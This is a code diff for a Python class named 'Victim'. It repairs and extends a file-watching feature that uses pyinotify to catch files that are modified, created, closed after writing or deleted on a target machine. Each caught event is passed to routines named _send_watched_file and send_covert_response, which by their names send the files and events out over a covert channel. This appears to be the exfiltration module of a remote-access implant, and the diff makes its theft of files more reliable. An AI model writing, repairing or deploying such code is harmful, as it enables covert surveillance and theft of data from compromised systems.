@@ -396,48 +396,72 @@ class Victim:
         try:
             import pyinotify
             
-            wm = pyinotify.WatchManager()
+            # FIX: Convert to absolute path
+            path = os.path.abspath(path)
             
-            class WatchHandler(pyinotify.ProcessEvent):
-                def __init__(watch_self, victim_instance):
-                    watch_self.victim = victim_instance
-                
-                def process_IN_MODIFY(watch_self, event):
-                    if not event.dir:
-                        print(f"[*] File modified: {event.pathname}")
-                        time.sleep(0.5)
-                        watch_self.victim._send_watched_file(event.pathname)
-                
-                def process_IN_CREATE(watch_self, event):
-                    if not event.dir:
-                        print(f"[*] File created: {event.pathname}")
-                        time.sleep(0.5)
-                        watch_self.victim._send_watched_file(event.pathname)
-                
-                def process_IN_DELETE(watch_self, event):
-                    print(f"[*] File deleted: {event.pathname}")
-                    watch_self.victim.send_covert_response(f"[WATCH DELETE] {event.pathname}\n")
-            
-            handler = WatchHandler(self)
-            observer = pyinotify.Notifier(wm, handler)
-            
-            mask = pyinotify.IN_MODIFY | pyinotify.IN_CREATE | pyinotify.IN_DELETE
-            
-            # FIX: Properly handle relative paths
+            # FIX: Determine watch directory and target file
             if os.path.isfile(path):
-                watch_path = os.path.dirname(os.path.abspath(path))
-                if not watch_path:
-                    watch_path = "."
-                print(f"[*] Watching directory {watch_path} for file {path}")
+                watch_dir = os.path.dirname(path)
+                target_file = os.path.basename(path)
+                # FIX: Handle empty dirname for files in current directory
+                if watch_dir == "":
+                    watch_dir = "."
+                print(f"[*] Watching file {target_file} in directory {watch_dir}")
             elif os.path.isdir(path):
-                watch_path = os.path.abspath(path)
-                print(f"[*] Watching directory {watch_path}")
+                watch_dir = path
+                target_file = None
+                print(f"[*] Watching directory {watch_dir}")
             else:
                 self.send_covert_response(f"Error: Path {path} does not exist.\n")
                 return
             
-            # Add watch (recursive for directories)
-            wm.add_watch(watch_path, mask, rec=True, auto_add=True)
+            wm = pyinotify.WatchManager()
+            
+            class WatchHandler(pyinotify.ProcessEvent):
+                def __init__(watch_self, victim_instance, target_file):
+                    watch_self.victim = victim_instance
+                    watch_self.target_file = target_file
+                
+                def process_IN_MODIFY(watch_self, event):
+                    if not event.dir:
+                        # FIX: Filter by target file if watching a single file
+                        if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
+                            print(f"[*] File modified: {event.pathname}")
+                            time.sleep(0.5)
+                            watch_self.victim._send_watched_file(event.pathname)
+                
+                def process_IN_CREATE(watch_self, event):
+                    if not event.dir:
+                        if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
+                            print(f"[*] File created: {event.pathname}")
+                            time.sleep(0.5)
+                            watch_self.victim._send_watched_file(event.pathname)
+                
+                def process_IN_DELETE(watch_self, event):
+                    if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
+                        print(f"[*] File deleted: {event.pathname}")
+                        watch_self.victim.send_covert_response(f"[WATCH DELETE] {event.pathname}\n")
+                
+                # FIX: Add IN_CLOSE_WRITE for reliable file write detection
+                def process_IN_CLOSE_WRITE(watch_self, event):
+                    if not event.dir:
+                        if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
+                            print(f"[*] File closed after write: {event.pathname}")
+                            time.sleep(0.5)
+                            watch_self.victim._send_watched_file(event.pathname)
+            
+            handler = WatchHandler(self, target_file)
+            observer = pyinotify.Notifier(wm, handler)
+            
+            # FIX: Correct event mask
+            mask = (
+                pyinotify.IN_MODIFY |
+                pyinotify.IN_CREATE |
+                pyinotify.IN_DELETE |
+                pyinotify.IN_CLOSE_WRITE
+            )
+            
+            wm.add_watch(watch_dir, mask, rec=True, auto_add=True)
             
             def watch_loop():
                 observer.loop()
